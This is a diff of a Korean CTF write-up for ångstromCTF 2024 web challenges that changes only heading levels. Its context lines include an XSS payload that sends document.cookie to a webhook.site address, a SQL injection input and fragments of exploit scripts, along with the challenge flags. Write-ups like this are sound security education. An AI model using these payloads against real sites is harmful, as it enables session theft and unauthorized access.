@@ -52,11 +52,11 @@ if (state.total >= 10_000 * 360) {
       
 `fetch()` 함수를 사용하여 요청을 보내 플래그를 읽어오면 된다.    
                        
-### Exploit Code      
+## Exploit Code      
                         
 <img src="/assets/images/ctf/2024/angstrom/spinner/flag.jpg" width="700px">                
         
-### Flag       
+## Flag       
 actf{b152d497db04fcb1fdf6f3bb64522d5e}           
                                  
 
@@ -111,7 +111,7 @@ app.get('/view/:id', (_req, res) => {
       
 `<img>` 태그를 사용하여 XSS를 발생시키고 봇에게 해당 URL을 넘겨주면 된다.    
        
-### Exploit Code     
+## Exploit Code     
 ```javascript
 <img src="x" onerror="location.href=`https://webhook.site/ddaad04c-461c-48d4-9321-4204304c1e0e/?c=`+document.cookie">
 ```    
@@ -120,7 +120,7 @@ app.get('/view/:id', (_req, res) => {
          
 <img src="/assets/images/ctf/2024/angstrom/markdown/flag.jpg" width="700px">        
       
-### Flag       
+## Flag       
 actf{b534186fa8b28780b1fcd1e95e2a2e2c}
               
 
@@ -164,7 +164,7 @@ def shout():
            
 `random.seed(0)`으로 시드 값이 고정되어있어 랜덤 값에 대해 유추가 가능하다.     
                         
-### Exploit Code     
+## Exploit Code     
 ```python
 import random
 import requests
@@ -203,7 +203,7 @@ print(r.text)
      
 <img src="/assets/images/ctf/2024/angstrom/winds/flag.jpg" width="700px">      
                   
-### Flag    
+## Flag    
 actf{2cb542c944f737b85c6bb9183b7f2ea8}
         
 <a id="store"></a>      
@@ -243,7 +243,7 @@ SQL Injection 취약점인 것 같아 `' or 1=1--` 입력을 시도해보니 다
 
 이후, `Blind SQL Injection` 쿼리를 작성하여 플래그를 획득했다.                              
        
-### Exploit Code  
+## Exploit Code  
 ```python
 import requests
 
@@ -372,7 +372,7 @@ print(flag)
            
 <img src="/assets/images/ctf/2024/angstrom/store/flag.jpg" width="700px">     
                    
-### Flag       
+## Flag       
 actf{37619bbd0b81c257b70013fa1572f4ed}          
             
 <a id="pastebin"></a>     
@@ -498,7 +498,7 @@ password-<function token_hex at 0x7b536f0a7e41> 1797c20bafbf9ef804afa75696d21b81
                  
 추가적으로, 다른 분이 올려준 코드를 보니 `secret.token_hex` 값의 마지막 자리 수가 `0`으로 나오기 때문에 16씩 값을 증가하면 훨씬 더 빠르게 값을 찾을 수 있다는 것이었다... 
                
-### Exploit Code      
+## Exploit Code      
 ```python
 import hashlib
 import requests 
@@ -520,7 +520,7 @@ for x in range(135598340834432, 0, -1):
             exit(0)
 ```
                              
-### Flag      
+## Flag      
 actf{47fd1d17b0c1121da0fc9d2d0c4fc109}         
                     
 <a id="tickler"></a>             
@@ -767,7 +767,7 @@ export type Router = typeof router
                
 그 이유는 CSP 정책이 `Content-Security-Policy: script-src 'self'`로 설정되어있어 JSONP, 유저가 업로드한 파일 등을 활용하면 스크립트를 실행시킬 수 있기 떄문이다.       
       
-### Exploit Code     
+## Exploit Code     
 
 ```php
 <?php
@@ -812,7 +812,7 @@ print(r.text)
   
 <img src="/assets/images/ctf/2024/angstrom/tickler/flag.jpg" width="700px">                   
 
-### Flag                      
+## Flag                      
 actf{c4d8f38d1195fda4b7e025f40e16942e}    
                 
 <a id="wwwwwwwwas"></a>            
@@ -924,7 +924,7 @@ wwwwwwwwaas: `https://wwwwwwwwaas.web.actf.co/`
       
 Markdown 문제에서 XSS 취약점이 발생하는 것을 활용해 XS-Leak을 수행할 수 있다.            
       
-### Exploit Code     
+## Exploit Code     
     
 ```python
 import requests
@@ -973,6 +973,6 @@ print(r.url)
             
 <img src="/assets/images/ctf/2024/angstrom/wwwwwwwwas/flag.jpg" width="700px">
        
-### Flag      
+## Flag      
 actf{the_w_watermarks_the_whereabouts}
 
